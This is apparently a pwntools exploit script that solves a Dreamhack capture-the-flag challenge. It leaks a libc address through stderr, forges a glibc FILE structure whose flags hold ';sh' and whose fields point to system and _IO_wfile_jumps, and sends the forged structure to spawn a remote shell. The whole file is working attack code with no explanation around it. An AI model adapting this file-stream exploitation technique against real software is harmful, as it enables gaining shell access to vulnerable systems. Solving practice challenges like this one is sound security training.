#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.binary = elf = ELF('./main')
# context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

HOST, PORT = "host3.dreamhack.games 17929".split()

def slog(n, a): return info(": ".join([n, hex(a)]))

s       = lambda data               :p.send(data)
sa      = lambda delim, data        :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim, data        :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda                    :p.recvline()
ru      = lambda delim, drop=True   :p.recvuntil(delim, drop)
l64     = lambda                    :u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))

if args.REMOTE:
    p = remote(HOST, PORT)
    libc = ELF('./libc.so.6') # or other exact path
else:
    p = process(env={"LD_PRELOAD":"./libc.so.6"}) # or env can be added
    libc = ELF('./libc.so.6')

fp = FileStructure()
print(fp)

ru(b':')
stderr = int(rl().strip(), 16)
lb = stderr - libc.sym["_IO_2_1_stderr_"]
libc.address = lb

slog("stderr", stderr)
slog("libc_base", lb)

fp.flags = b'\x01'*4 + b';sh'
fp._IO_write_ptr = 0x10
fp.markers = libc.sym["system"]
fp._lock = stderr + 0x100 # r/w addr
fp._wide_data = stderr # overlapping
fp.unknown2 = 0xffffffff # this must be _mode
fp.vtable = libc.sym["_IO_wfile_jumps"]

pay = bytes(fp) + p64(stderr-0x8)
print(hex(len(pay)))
sl(pay)

p.interactive()